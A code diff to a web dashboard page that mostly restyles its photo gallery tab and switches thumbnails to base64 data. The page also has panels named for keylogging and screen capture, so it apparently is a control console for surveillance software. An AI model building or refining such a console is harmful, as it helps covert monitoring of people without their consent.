@@ -366,26 +366,58 @@ body {
     word-break: break-all;
 }
 
-/* Gallery specific */
+/* ===== GALLERY SPECIFIC STYLES ===== */
+.gallery-content {
+    margin: 20px;
+    padding: 0;
+    background: transparent;
+    border: none;
+}
+
 .gallery-controls {
     display: flex;
     align-items: center;
     gap: 12px;
     flex-wrap: wrap;
+    background: #1a1214;
+    border: 1px solid #2d1d20;
+    border-radius: 14px;
+    padding: 14px 18px;
+    margin-bottom: 20px;
+}
+
+.gallery-controls label {
+    color: #aaa;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    font-weight: 600;
 }
 
 .gallery-controls select {
-    background: #1a1214;
-    color: #eee;
+    background: #0d0a0b;
+    color: #fff;
     border: 1px solid #3b292d;
-    border-radius: 8px;
-    padding: 8px 12px;
-    font-size: 12px;
+    border-radius: 10px;
+    padding: 10px 14px;
+    font-size: 13px;
     outline: none;
+    cursor: pointer;
+    transition: border-color 0.2s;
+    min-width: 120px;
 }
 
+.gallery-controls select:hover,
 .gallery-controls select:focus {
     border-color: #ff3439;
+    box-shadow: 0 0 8px rgba(255, 50, 55, 0.2);
+}
+
+.gallery-controls .refresh-btn,
+.gallery-controls .force-btn {
+    padding: 10px 20px;
+    font-size: 12px;
+    white-space: nowrap;
 }
 
 .gallery-section-title {
@@ -417,6 +449,7 @@ body {
     overflow: hidden;
     cursor: pointer;
     transition: transform 0.2s, box-shadow 0.2s;
+    position: relative;
 }
 
 .media-card:hover {
@@ -449,14 +482,6 @@ body {
     font-size: 9px;
     color: #888;
     margin-top: 4px;
-}
-
-.media-type-badge {
-    position: absolute; /* requires parent positioning */
-}
-
-.media-card {
-    position: relative;
 }
 
 .media-type-badge {
@@ -583,6 +608,9 @@ body {
     .media-grid, .skeleton-grid {
         grid-template-columns: repeat(3, 1fr);
     }
+    .gallery-controls {
+        gap: 8px;
+    }
 }
 
 @media(max-width: 600px) {
@@ -629,6 +657,14 @@ body {
     .gallery-controls {
         flex-direction: column;
         align-items: flex-start;
+    }
+    .gallery-controls select {
+        width: 100%;
+    }
+    .gallery-controls .refresh-btn,
+    .gallery-controls .force-btn {
+        width: 100%;
+        margin-top: 4px;
     }
 }
 </style>
@@ -729,7 +765,7 @@ body {
         </div>
         <div class="gallery-content">
             <div class="gallery-controls">
-                <label>Count:</label>
+                <label for="galleryCountSelect">Count:</label>
                 <select id="galleryCountSelect">
                     <option value="10" selected>10 Photos</option>
                     <option value="25">25 Photos</option>
@@ -1041,7 +1077,6 @@ async function fetchGalleryPhotos(fetchAll = false) {
     const errorDiv = document.getElementById("galleryError");
     const errorText = document.getElementById("galleryErrorText");
 
-    // Reset UI
     latestGrid.innerHTML = '';
     allGrid.innerHTML = '';
     errorDiv.style.display = 'none';
@@ -1073,7 +1108,7 @@ function renderGalleryGrids() {
     const latestBadge = document.getElementById("latestCountBadge");
     const allBadge = document.getElementById("allCountBadge");
 
-    const latestItems = galleryItems.slice(0, 10); // Latest 10
+    const latestItems = galleryItems.slice(0, 10);
     const allItems = galleryItems;
 
     latestBadge.textContent = latestItems.length;
@@ -1085,7 +1120,7 @@ function renderGalleryGrids() {
 
 function createMediaCard(item, index) {
     const type = item.type || 'image';
-    const thumb = item.thumbnailUrl || item.url || '';
+    const thumb = item.thumbnailBase64 ? `data:image/jpeg;base64,${item.thumbnailBase64}` : '';
     const filename = item.filename || 'Unknown';
     const timestamp = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown';
     const size = item.size ? formatFileSize(item.size) : 'Unknown';
@@ -1118,10 +1153,11 @@ function openMediaViewer(index) {
     const item = galleryItems[index];
 
     let html = '';
+    const thumb = item.thumbnailBase64 ? `data:image/jpeg;base64,${item.thumbnailBase64}` : '';
     if (item.type === 'video') {
-        html = `<video controls src="${item.url}" style="max-width:100%;max-height:80vh;"></video>`;
+        html = `<video controls src="${thumb}" style="max-width:100%;max-height:80vh;"></video>`;
     } else {
-        html = `<img src="${item.url}" alt="${escapeHtml(item.filename)}">`;
+        html = `<img src="${thumb}" alt="${escapeHtml(item.filename)}">`;
     }
 
     content.innerHTML = html;
@@ -1178,7 +1214,7 @@ function showGallery(btn) {
     document.getElementById("galleryPanel").style.display = "block";
     document.getElementById("keylogPanel").style.display = "none";
     document.getElementById("screenPanel").style.display = "none";
-    // Auto fetch 10 photos when tab opened
+    // Auto fetch when tab opened
     fetchGalleryPhotos(false);
 }
 
